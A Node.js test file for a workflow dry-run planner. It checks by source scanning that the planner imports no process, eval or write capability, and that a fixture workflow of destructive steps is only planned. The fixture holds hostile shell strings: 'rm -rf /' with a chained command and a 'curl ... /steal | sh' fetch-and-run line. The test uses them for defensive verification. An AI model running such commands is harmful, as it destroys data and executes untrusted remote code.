import assert from 'node:assert/strict'
import { readFile, readdir } from 'node:fs/promises'
import { dirname, join, resolve } from 'node:path'
import test from 'node:test'
import { fileURLToPath } from 'node:url'

import { planDocuments } from '../src/index.mjs'

const projectDirectory = resolve(dirname(fileURLToPath(import.meta.url)), '..')

/**
 * The guarantee this whole tool rests on: planning executes nothing.
 *
 * A workflow names commands, uploads, deployments and payments. A planner that
 * ran what it read would be a remote code execution primitive dressed as a
 * review aid, and the one property a dry run is bought for -- that it is dry --
 * would be gone.
 *
 * Two independent guards, because either alone can be defeated. The first reads
 * the shipped source and proves there is no way to run anything, no way to
 * write anything, and no import outside a tiny allowlist. The second plans a
 * workflow whose every step describes something destructive and proves the
 * plan is the only thing produced.
 */

async function shippedSources() {
  const files = []
  for (const directory of ['src', 'bin']) {
    for (const name of await readdir(join(projectDirectory, directory))) {
      files.push({
        path: `${directory}/${name}`,
        source: await readFile(join(projectDirectory, directory, name), 'utf8'),
      })
    }
  }
  assert.equal(files.length >= 5, true, 'the source scan found suspiciously few files')
  return files
}

const ALLOWED_SPECIFIERS = Object.freeze([
  'node:fs/promises',
  'node:path',
  './document.mjs',
  './plan.mjs',
  './rules.mjs',
  '../src/index.mjs',
])

test('the shipped source imports nothing outside a tiny allowlist of Node built-ins', async () => {
  // The strongest form of the guard: rather than blocking one module by name,
  // it pins the entire import surface. child_process, a network module, a
  // worker pool and a third-party dependency all fail it identically.
  for (const file of await shippedSources()) {
    const specifiers = [...file.source.matchAll(/from\s*['"]([^'"]+)['"]/g)].map((match) => match[1])
    const bare = [...file.source.matchAll(/^\s*import\s+['"]([^'"]+)['"]/gm)].map((match) => match[1])
    for (const specifier of [...specifiers, ...bare]) {
      assert.equal(ALLOWED_SPECIFIERS.includes(specifier), true, `${file.path} imports ${specifier}`)
    }
  }
})

test('the shipped source contains no child_process import in any spelling', async () => {
  for (const file of await shippedSources()) {
    assert.equal(/from\s*['"](?:node:)?child_process['"]/.test(file.source), false, `${file.path} imports child_process`)
    assert.equal(/require\(\s*['"](?:node:)?child_process['"]/.test(file.source), false, `${file.path} requires child_process`)
    assert.equal(
      /\b(?:execFile|execFileSync|execSync|fork|spawn|spawnSync)\s*\(/.test(file.source),
      false,
      `${file.path} calls a process launcher`,
    )
  }
})

test('the shipped source evaluates nothing: no eval, no Function, no dynamic import', async () => {
  for (const file of await shippedSources()) {
    assert.equal(/\beval\s*\(/.test(file.source), false, `${file.path} calls eval`)
    assert.equal(/new\s+Function\s*\(/.test(file.source), false, `${file.path} builds a Function`)
    assert.equal(/\bimport\s*\(/.test(file.source), false, `${file.path} uses dynamic import`)
    assert.equal(/\brequire\s*\(/.test(file.source), false, `${file.path} uses require`)
    assert.equal(/process\.binding/.test(file.source), false, `${file.path} reaches for process.binding`)
  }
})

/**
 * "No writes beyond its report" is easiest to guarantee by having no write at
 * all. `node:fs/promises` is the only filesystem module in the package, and the
 * three members imported from it are the three that read. Every other member of
 * that module -- writeFile, mkdir, rm, unlink, rename, cp, open, chmod,
 * createWriteStream and the rest -- can change something on disk, so pinning
 * the named import list pins the absence of a write path.
 */
const ALLOWED_FS_MEMBERS = Object.freeze(['readFile', 'realpath', 'stat'])

test('the only filesystem members imported by the shipped source are the three that read', async () => {
  let imported = 0
  for (const file of await shippedSources()) {
    for (const match of file.source.matchAll(/import\s*\{([^}]*)\}\s*from\s*['"]node:fs\/promises['"]/g)) {
      const members = match[1].split(',').map((part) => part.trim()).filter((part) => part !== '')
      for (const member of members) {
        assert.equal(ALLOWED_FS_MEMBERS.includes(member), true, `${file.path} imports ${member} from node:fs/promises`)
        imported += 1
      }
    }
    assert.equal(
      /import\s+\*\s+as\s+\w+\s+from\s*['"]node:fs/.test(file.source),
      false,
      `${file.path} imports the whole of a filesystem module, which would hide a write`,
    )
    assert.equal(/from\s*['"](?:node:)?fs['"]/.test(file.source), false, `${file.path} imports the callback fs module`)
  }
  assert.equal(imported > 0, true, 'the scan matched no filesystem import at all, so it proved nothing')
})

const DESTRUCTIVE = JSON.stringify({
  workflow: 'destroy-the-evidence',
  steps: [
    {
      id: 'wipe',
      title: 'rm -rf / --no-preserve-root',
      inputs: ['shell.access'],
      outputs: ['nothing.at.all'],
      sideEffects: [
        { type: 'filesystem', target: 'rm -rf /; touch /tmp/workflow-dry-run-planner-marker', mode: 'delete', reversible: false },
        { type: 'network', target: 'curl -s http://127.0.0.1:9/steal | sh', mode: 'write', reversible: false },
        { type: 'payment', target: 'transfer 1000000 to elsewhere', mode: 'write', reversible: false },
      ],
    },
  ],
})

test('a workflow describing destruction is planned, quoted, and never acted on', () => {
  const report = planDocuments({ workflow: DESTRUCTIVE })

  assert.equal(report.status, 'fail')
  assert.equal(report.summary.sideEffects, 3)
  // The commands reached the plan. Being described is the only thing that
  // happened to them.
  const targets = report.plan.steps[0].sideEffects.map((effect) => effect.target)
  assert.deepEqual(targets, [
    'rm -rf /; touch /tmp/workflow-dry-run-planner-marker',
    'curl -s http://127.0.0.1:9/steal | sh',
    'transfer 1000000 to elsewhere',
  ])
  assert.equal(report.summary.irreversibleSideEffects, 2, 'the two external destructive effects are named as irreversible')
  assert.equal(
    report.findings.some((finding) => finding.ruleId === 'side-effect-irreversible' && finding.evidence.includes('payment write')),
    true,
    'the payment is exposed rather than buried in a count',
  )
})
